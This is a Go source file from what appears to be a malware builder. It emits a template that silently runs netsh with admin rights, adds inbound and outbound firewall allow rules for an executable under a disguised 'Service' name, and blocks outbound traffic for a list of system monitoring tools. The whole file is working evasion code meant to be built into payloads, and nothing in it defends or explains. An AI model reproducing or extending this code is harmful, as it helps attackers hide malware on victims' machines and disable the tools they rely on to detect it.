package buildergen

import "strings"

func templateFirewall() string {
	return strings.TrimSpace(`
func setupFirewallRules(exePath string) {
	if !isAdmin() {
		return
	}

	ruleName := getDisplayName() + " Service"

	addAllow := cmdHidden(getNetshExeName(),
		"advfirewall", "firewall", "add", "rule",
		"name="+ruleName,
		"dir=out",
		"action=allow",
		"program="+exePath,
		"enable=yes",
		"profile=any",
	)
	_ = addAllow.Run()

	addAllowIn := cmdHidden(getNetshExeName(),
		"advfirewall", "firewall", "add", "rule",
		"name="+ruleName+" Inbound",
		"dir=in",
		"action=allow",
		"program="+exePath,
		"enable=yes",
		"profile=any",
	)
	_ = addAllowIn.Run()

	blockProgs := getMonitoringTools()
	for _, prog := range blockProgs {
		blockName := "Block " + strings.TrimSuffix(prog, ".exe")
		blockCmd := cmdHidden(getNetshExeName(),
			"advfirewall", "firewall", "add", "rule",
			"name="+blockName,
			"dir=out",
			"action=block",
			"program="+filepath.Join(os.Getenv("SystemRoot"), "System32", prog),
			"enable=yes",
		)
		_ = blockCmd.Run()
	}
}

func isFirewallRulePresent(ruleName string) bool {
	cmd := cmdHidden(getNetshExeName(), "advfirewall", "firewall", "show", "rule", "name="+ruleName)
	out, err := cmd.Output()
	if err != nil {
		return false
	}
	return len(out) > 0 && !strings.Contains(string(out), "No rules")
}
`)
}
